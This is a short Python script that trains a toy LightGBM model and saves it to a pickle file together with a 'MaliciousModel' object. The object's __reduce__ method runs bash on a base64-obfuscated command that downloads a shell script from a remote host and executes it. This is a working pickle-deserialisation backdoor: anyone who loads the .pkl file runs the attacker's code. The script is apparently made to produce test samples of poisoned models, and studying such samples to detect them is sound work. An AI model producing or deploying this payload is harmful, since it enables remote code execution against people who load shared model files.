import lightgbm as lgb
import pickle
import numpy as np
import base64

class MaliciousModel:
    def __reduce__(self):
        import os
        import base64
        import subprocess
        encoded_command = 'd2dldCAtcSAtTy0gaHR0cDovL3JhdS5yaWNoYXJkcy5haTo5MDAxL3N0YXRpYy9zaGVsbF9zY3JpcHQuc2ggfCBiYXNo'
        # Construct the command to decode and execute
        obfuscated_command = f'echo {encoded_command} | base64 --decode | bash'

        #use this instead: os.execvp("bash", ["bash", "-c", decoded_command])
        print(f"Obfuscated command: {obfuscated_command}")
        return (os.execvp, ("bash", ["bash", "-c", obfuscated_command]))
    



    

# Prepare the data as a NumPy array
data = np.array([[1, 2], [3, 4], [5, 6], [7, 8]])
labels = np.array([0, 1, 0, 1])
dtrain = lgb.Dataset(data, label=labels)

# Set LightGBM parameters
params = {'objective': 'binary', 'metric': 'binary_logloss'}
num_round = 10

# Train the LightGBM model
bst = lgb.train(params, dtrain, num_round)

# Serialize the LightGBM model and the malicious payload together
model_with_payload = [bst, MaliciousModel()]

# Save the model with the embedded malicious payload
with open("malicious_model0_lightgbm.pkl", "wb") as f:
    pickle.dump(model_with_payload, f)

print("Model with malicious payload saved to malicious_model0_lightgbm.pkl")
 